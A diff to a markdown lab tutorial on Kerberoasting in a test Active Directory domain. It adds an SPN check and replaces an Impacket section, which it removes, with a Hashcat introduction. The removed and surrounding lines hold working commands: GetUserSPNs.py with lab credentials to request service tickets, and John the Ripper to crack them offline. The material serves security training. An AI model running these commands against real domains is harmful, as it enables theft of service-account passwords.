@@ -3,7 +3,7 @@
 > **So why is Kerberoasting so interesting :**
 >
 >- can be performed from any ***domain joined machine***.
->- user needs no special privileges to request a service ticket - ***ANY*** user can do this.
+>- user needs no special privileges to request a service ticket - ***ANY*** authenticated user can do this.
 >- The target system doesn't even need to be available or even exist anymore, if the SPN (service account that exists is enough).
 >- Very hard to spot as this blends in with other service ticket requests.
 >- Cracking the ticket happens ***off-line***.
@@ -79,6 +79,14 @@ setspn -A SVC_SQL/dc.acme.local:12345 acme\SVC_sql
 ```
 
 The setspn -A command will set up the SPN for the service account, in this case for a service on the domain controller (dc.acme.local) on port 12345.
+
+Let's check if the SPN was correctly registered:
+
+```
+setspn -T acme -Q */*
+```
+
+![image](./images/02_getspnexe.jpg)
 
 # KERBEROASTING IN ACTION
 ---
@@ -168,42 +176,8 @@ john --show kerb-hash.txt
 
 ![image](./assets/03_john2.jpg)
 
-# BONUS : IMPACKET PYTHON
+# BONUS : USING HASHCAT
 ---
 
-- SOURCE: [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
+> HashCat is a more powerful and common password cracking tool, in the steps below we'll show how to install HasChat on ubuntu and use it to crack Kerberos tickets.
 
-![image](./assets/04_impacket.jpg)
-
-Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself.
-Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.
-
-> Impacket basically allows you to run a ton of scripts and attacks for windows machines, from a linux box (like Kali), using Python.
-
-You can find some more info here as well: [https://www.secureauth.com/labs/open-source-tools/impacket](https://www.secureauth.com/labs/open-source-tools/impacket)
-
-Installation on your `Windows 10 Machine` (you need Python) open a **command** prompt in ***Administrator*** mode:
-
-```code
-cd /
-git clone https://github.com/SecureAuthCorp/impacket.git
-cd /impacket
-pip install .
-```
-
-We can now run GetUserSPNs.py from any machine (even non-domain joined), you do need credentials - regular domain user credentials - this enumerates the user accounts that have an SPN's associated with them, and also requests TGS (service tickets):
-
-```
-GetUserSPNs.py acme.local/student01:student01 -o spns.txt -request -dc-ip 10.0.0.4
-```
-
-and run John the ripper on **"spns.txt"**
-
-```code
-sudo -i
-john spns.txt --wordlist=/opt/threathunt/labs/4_KERBEROAST/Top1000.txt 
-john spns.txt --show
-cat ~/.john/john.pot
-```
-
-![omage](./assets/03_john_impacket.jpg)
